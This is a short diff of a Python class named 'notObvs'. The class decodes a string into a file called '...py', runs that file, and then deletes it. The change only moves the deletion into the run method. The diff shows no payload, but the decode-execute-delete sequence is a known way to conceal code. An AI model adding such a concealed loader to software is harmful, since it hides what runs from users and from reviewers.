@@ -38,13 +38,10 @@ class notObvs:
                         with open("...txt", "a") as tempWrite:
                             tempWrite.write(j)
         self.transfer()
-    
-    def kill(self):
-        os.remove("...py")
 
     def run(self):
-        os.system("python3 ...py")
-        self.kill()
+        os.system("python3 ...py") #change to "python ...py" if on windows
+        os.remove("...py")
         
     def decode(self,string,key):   
         tempWrite = open("...py","w")
